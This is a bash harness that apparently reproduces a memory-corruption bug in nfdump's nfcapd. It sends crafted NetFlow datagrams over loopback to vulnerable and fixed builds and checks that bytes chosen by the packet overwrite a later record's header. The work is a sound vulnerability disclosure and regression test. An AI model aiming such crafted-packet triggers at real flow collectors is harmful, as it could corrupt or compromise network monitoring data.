#!/usr/bin/env bash
# nfdump2shell: live loopback proof that the pinned truncated-EXgenericFlow
# ICMP swap writes packet-chosen bytes into a LATER record's V3 header, not
# only its flow payload. Runs ASan and plain vulnerable collectors plus a
# complete-element safe control and the pinned fixed build.
set -u
cd "$(dirname "$0")"
V=${V_BUILD:-src/build-vuln-asan/src}
F=${F_BUILD:-src/build-fixed-asan/src}
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${HDR_OUT:-harness/out/hdr}
if [ ! -x "$V/nfcapd/nfcapd" ] || [ ! -x "$F/nfcapd/nfcapd" ] || [ ! -x "$VP/nfcapd/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT"

PASS=0; FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
need() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3"; fi
}
none() { # FILE PATTERN LABEL
    if grep -q "$2" "$1" 2>/dev/null; then bad "$3"; else ok "$3"; fi
}

run_case() { # LABEL BUILD PORT MODE
    local label=$1 build=$2 port=$3 mode=$4
    local dir="$OUT/$label"
    rm -rf "$dir"; mkdir -p "$dir/flows"
    ASAN_OPTIONS=detect_leaks=0 "$build/nfcapd/nfcapd" \
        -4 -b 127.0.0.1 -p "$port" -M "$dir/flows" -t 5 >"$dir/daemon.log" 2>&1 &
    local pid=$!
    sleep 1
    python3 harness/wire_send.py "$port" "$mode" >"$dir/sender.log" 2>&1
    sleep 1
    kill -TERM "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    local cap
    cap=$(find "$dir/flows" -type f | sort | head -1)
    printf 'REC2_FOUND=0\n' >"$dir/readback.txt"
    if [ -n "$cap" ]; then
        python3 harness/alias_readback.py "$cap" hdr >"$dir/readback.txt" 2>&1
        ASAN_OPTIONS=detect_leaks=0 "$build/nfdump/nfdump" -r "$cap" \
            -o 'fmt:%ts|%sp|%dp|%pr|%pkt|%byt' >"$dir/flows.txt" 2>&1 || true
    else
        printf 'Summary: total flows: 0\n' >"$dir/flows.txt"
    fi
    echo "=== $label mode=$mode ==="
    head -1 "$dir/sender.log"
    cat "$dir/readback.txt"
    grep -E 'Corrupt nfd record|record size error|ERROR: AddressSanitizer' "$dir/daemon.log" || true
    grep -E '^Summary: total flows' "$dir/flows.txt" 2>/dev/null || true
}

run_case vuln-hdr-asan "$V" 10121 hdr; D="$OUT/vuln-hdr-asan"
need "$D/sender.log" 'WIRE_LEN=128' 'hdr: 128-byte two-record datagram'
need "$D/readback.txt" 'REC2_EXPORTER=0000 REC2_FLAGS_NFVERSION=ab03' 'asan vuln: chosen exporterID swapped into processed record 2 header'
need "$D/flows.txt" 'total flows: 2' 'asan vuln: two flows written'
none "$D/daemon.log" 'ERROR: AddressSanitizer' 'asan vuln: no report in 64 KiB buffer'

run_case vuln-hdr-plain "$VP" 10122 hdr; D="$OUT/vuln-hdr-plain"
need "$D/readback.txt" 'REC2_EXPORTER=0000 REC2_FLAGS_NFVERSION=ab03' 'plain vuln: same chosen header bytes without ASan'
need "$D/flows.txt" 'total flows: 2' 'plain vuln: two flows written'

run_case vuln-hdr-safe "$V" 10123 hdr-safe; D="$OUT/vuln-hdr-safe"
need "$D/sender.log" 'WIRE_LEN=144' 'safe: 144-byte two-record datagram'
need "$D/readback.txt" 'REC2_EXPORTER=03ab REC2_FLAGS_NFVERSION=0003' 'safe: no swap into processed record 2 header'
need "$D/flows.txt" 'total flows: 2' 'safe: two flows written'

run_case fixed-hdr "$F" 10124 hdr; D="$OUT/fixed-hdr"
need "$D/daemon.log" 'Corrupt nfd record: expected 2 records, processd: 0' 'fixed: short element rejected live'
need "$D/flows.txt" 'total flows: 0' 'fixed: no flow written'
need "$D/readback.txt" 'REC2_FOUND=0' 'fixed: no processed record 2'

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
